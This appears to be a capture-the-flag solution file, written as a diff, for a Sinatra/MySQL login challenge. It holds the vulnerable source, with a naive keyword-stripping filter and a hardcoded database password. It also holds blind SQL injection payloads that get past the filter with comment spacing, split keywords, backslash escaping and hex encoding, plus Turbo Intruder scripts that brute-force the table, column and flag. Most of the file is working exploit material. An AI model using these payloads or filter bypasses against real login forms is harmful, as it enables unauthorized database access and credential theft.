@@ -1,0 +1,125 @@
+#username = "g u e s t";
+#password = "'/**/O R/**/2>1--/**/"
+
+#bypass space
+#/**/
+
+#bypass keyword
+#U N I O N -> UNION (space is removed)
+
+#bypass '"
+# \
+
+source code:
+require 'sinatra'
+require 'mysql2'
+db = Mysql2::Client.new(host: 'mysql', username: 'root', password: 'pa55w0rd', database: 'db')
+
+def sqli_waf (str)
+    str.gsub(/union|select|where|and|or| |=/i, '')
+end
+
+def addslashes (str)
+    str.gsub(/['"]/,'\\\\\0')
+end
+
+get '/' do
+    p %{
+    <h1>Log me in: Final</h1>
+    <form method="POST" action="/login">
+        <input type="text" name="username" placeholder="guest">
+		<input type="password" name="password" placeholder="guest">
+		<button>Login</button>
+    </form>
+    }
+end
+
+post '/login' do
+    @params = Hash[params.map { |key, value| [key, sqli_waf(value)] }]
+    query = "SELECT * FROM users WHERE username='#{addslashes(@params['username'])}' and password='#{addslashes(@params['password'])}'"
+    result = db.query(query).first
+    if result
+        "Welcome!"
+    else
+        "Incorrect username or password."
+    end
+end
+
+
+Query
+SELECT * FROM users WHERE username='guest\' and password='
+payload for bruteforce admin password
+admin: /**/O R/**/username/**/LIKE/**/0x61646d696e/**/A ND/**/LENGTH(p a s s w o r d)/**/LIKE/**/25#
+/**/O R/**/username/**/LIKE/**/0x61646d696e/**/A ND/**/SUBSTR(p a s s w o r d,1,8)/**/LIKE/**/CHAR(102,108,97,103,40,37,115,95)#
+flag(IS_IN_ANOTHER_TABLE)
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           requestsPerConnection=1,
+                           pipeline=False
+                           )
+    #printable_ascii = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&\()*+,-./:;<=>?@[\\]^_`{|}~"
+    # ASCII TABLE: 32~126
+    for i in range(32,127):
+        payload = str(i)
+        engine.queue(target.req, payload.rstrip())
+
+def handleResponse(req, interesting):
+    # currently available attributes are req.status, req.wordcount, req.length and req.response
+    if req.status == 200 and 'Welcome' in req.response:
+        table.add(req)
+
+Brute force databae name
+URLENCODED: /**/U+N+I+O+N/**/S+E+L+E+C+T/**/table_name,table_schema,NULL/**/F+R+O+M/**/i+n+f+o+r+m+a+t+i+o+n+_+s+c+h+e+m+a+.+t+a+b+l+e+s/**/W+H+E+R+E/**/table_name/**/LIKE/**/0x6833795f686572655f31355f7468655f666c61675f7930755f77346e745f6d656f775f666c6167/**/A+N+D/**/table_schema/**/LIKE/**/0x6462%23
+database: db
+hex: 0x6462
+
+
+Brute force table name
+/**/U N I O N/**/S E L E C T/**/table_name,NULL,NULL/**/F R O M/**/i n f o r m a t i o n _ s c h e m a . t a b l e s/**/W H E R E/**/SUBSTR(table_name,1,1)/**/LIKE/**/CHAR(0)#
+Wierd prefix h3y
+table name: h3y_here_15_the_flag_y0u_w4nt,meow,flag
+hex: 6833795f686572655f31355f7468655f666c61675f7930755f77346e745f6d656f775f666c6167
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           requestsPerConnection=1,
+                           pipeline=False
+                           )
+    #printable_ascii = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&\()*+,-./:;<=>?@[\\]^_`{|}~"
+    # ASCII TABLE: 32~126
+    #first_char = "4144,4150,415f,4348,434f,435f,454e,4556,455f,4649,465f,494e,495f,4b45,4b5f,4f50,4f5f,5041,504c,5052,505f,5245,524f,525f,5343,5354,535f,5441,5452,545f,5553,555f,5649,565f,6163,615f,6269,625f,636f,6461,6462,6465,645f,656e,6572,6576,655f,6669,6675,665f,6765,676c,6774,675f,6833,6865,686f,685f,696e,696f,695f,6b65,6b5f,6c61,6c6f,6c5f,6d65,6d75,6d5f,6f62,6f5f,7061,7065,706c,7072,7073,705f,7265,726f,7277,725f,7363,7365,736c,736f,7374,7379,735f,7461,7468,7469,746c,745f,7573,755f,7661,7665,765f,7761,775f,785f"
+    #first_char = first_char.split(',')
+#    f = open('D:\\prefix.txt','r')
+#    lines = f.readlines()
+    candidate = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_"
+#    for i in lines:
+#        res = i[2:].strip()
+#        res = [chr(int(res[k:k+2],16)) for k in range(0,len(res),2)]
+#        res = "".join(res)
+#        print(res)
+#        for j in candidate:
+#            payload = i.strip()+hex(ord(j))[2:]
+#            if payload[-4:] == '5f5f':
+#                continue
+#            engine.queue(target.req, payload)
+    for j in candidate:
+        payload = '0x6833795f686572655f31355f7468655f666c61675f7930755f77346e745f6d656f775f666c6167' + hex(ord(j))[2:]
+        engine.queue(target.req, payload)
+def handleResponse(req, interesting):
+    # currently available attributes are req.status, req.wordcount, req.length and req.response
+    if req.status == 200 and 'Welcome' in req.response:
+        table.add(req)
+
+Brute force column name
+URLENCODED: /**/U+N+I+O+N/**/S+E+L+E+C+T/**/column_name,NULL,NULL/**/F+R+O+M/**/i+n+f+o+r+m+a+t+i+o+n+_+s+c+h+e+m+a+.+c+o+l+u+m+n+s/**/W+H+E+R+E/**/table_name/**/LIKE/**/0x6833795f686572655f31355f7468655f666c61675f7930755f77346e745f6d656f775f666c6167/**/A+N+D/**/SUBSTR(column_name,1,2)/**/LIKE/**/%s%23
+column name: i_4m_th3_fl4g
+hex: 695f346d5f7468335f666c3467
+
+Brute force value of flag
+/**/U N I O N/**/S E L E C T/**/i_4m_th3_fl4g,NULL,NULL/**/F R O M/**/h3y_here_15_the_flag_y0u_w4nt,meow,flag/**/W H E R E/**/SUBSTR(i_4m_th3_fl4g,1,1)/**/LIKE/**/CHAR(0)#
+FLAG{!!!b00lean_bas3d_OR_err0r_based_sqli???}
+
+
+PAYLOAD for LENGTH of password
+/**/O R/**/username/**/LIKE/**/0x61646d696e/**/A ND/**/LENGTH(p a s s w o r d)/**/LIKE/**/25#
